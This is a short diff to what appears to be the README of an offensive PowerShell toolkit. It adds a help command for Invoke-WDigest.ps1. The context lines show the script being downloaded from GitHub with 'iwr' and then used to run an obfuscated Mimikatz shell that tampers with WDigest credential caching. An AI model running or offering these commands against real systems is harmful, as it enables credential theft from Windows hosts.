@@ -15,6 +15,9 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Device
 
 **run cmdlet:**
 ```powershell
+# Cmdlet help
+Get-Help .\Invoke-WDigest.ps1 -full
+
 # Execute M[i]mika[t]z (interactive shell) without WDigest caching
 .\Invoke-WDigest.ps1 -wdigest 'false' -mimicats
 
